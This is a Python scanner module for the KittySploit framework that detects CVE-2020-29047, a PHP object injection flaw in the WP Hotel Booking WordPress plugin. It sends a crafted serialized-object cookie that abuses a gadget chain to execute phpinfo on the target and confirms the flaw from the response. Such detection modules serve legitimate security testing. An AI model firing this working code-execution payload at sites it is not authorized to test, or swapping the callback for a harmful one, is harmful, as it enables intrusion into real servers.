#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The wp-hotel-booking plugin through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Hotel Booking < 1.10.4 - PHP Object Injection Detection',
        'description': 'The wp-hotel-booking plugin through 1.10.2 for WordPress allows remote attackers to execute arbitrary code because of an unserialize operation on the thimpress_hotel_booking_1 cookie in load in includes/class-wphb-sessions.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'wp-plugin', 'wp', 'wp-hotel-booking', 'rce', 'thimpress', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wordpress.org/plugins/wp-hotel-booking/#developers',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29047',
        ],
        'cve': 'CVE-2020-29047',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'wp-hotel-booking',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='WP Hotel Booking < 1.10.4 - PHP Object Injection detected', path=path)
            return True
        return False

